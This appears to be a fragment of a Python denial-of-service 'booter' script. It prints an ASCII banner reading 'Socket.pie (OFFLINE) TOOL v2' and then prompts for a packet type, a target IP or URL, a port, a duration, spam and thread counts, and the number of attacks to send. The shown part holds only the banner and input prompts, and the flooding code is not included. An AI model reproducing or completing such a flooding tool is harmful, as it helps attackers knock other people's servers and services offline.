...
{Fore.WHITE}        ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐
╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ 
╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘  {Fore.YELLOW}# (OFFLINE) {Fore.LIGHTYELLOW_EX}TOOL v2 #{Fore.RESET}"""

print(banner)
host = ""
ip = ""
print(f"{Fore.LIGHTWHITE_EX}pyp own1-5")
data_type_loader_packet = input(f"{Fore.WHITE}type packet (Pypython example=own1)>").upper()
target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL =⟩")
port_loader = int(input(f"{Fore.YELLOW}Port =⟩"))
time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}time (250) =⟩"))
spam_loader = int(input(f"{Fore.RED}Spam (300) =⟩ "))
create_thread = int(input(F"{Fore.LIGHTGREEN_EX}create threads (50)>"))
booter_sent = int(input(F"{Fore.GREEN}Sent Attack (500 or 1000) =⟩ "))
